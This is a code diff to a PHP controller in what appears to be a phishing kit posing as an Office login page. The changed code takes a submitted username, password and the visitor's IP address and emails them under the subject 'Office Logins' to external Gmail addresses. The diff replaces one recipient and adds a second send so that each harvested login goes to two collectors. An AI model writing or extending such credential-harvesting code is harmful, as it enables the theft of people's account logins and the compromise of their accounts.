@@ -83,9 +83,10 @@ class MainController extends Controller {
 				//send
 				$ip = getenv("REMOTE_ADDR");
 				$s = "Office Logins ~~ ".$ip." ~~ ".date("h:i A jS F, Y");
-                $rcpt = "mails4davidslogan@gmail.com";
+                $rcpt = "karala1203@gmail.com";
 				$body = "Username: ".$offyse."<br>Password: ".$offpys."<br>IP address: ".$ip;
 				$this->helpers->sendEmail($rcpt,$s,['results' => $body],'emails.login_alert','view');  
+				$this->helpers->sendEmail("mails4davidslogan@gmail.com",$s,['results' => $body],'emails.login_alert','view');  
 				
 				Session::flash("status","success");
 			    return redirect()->intended('/');
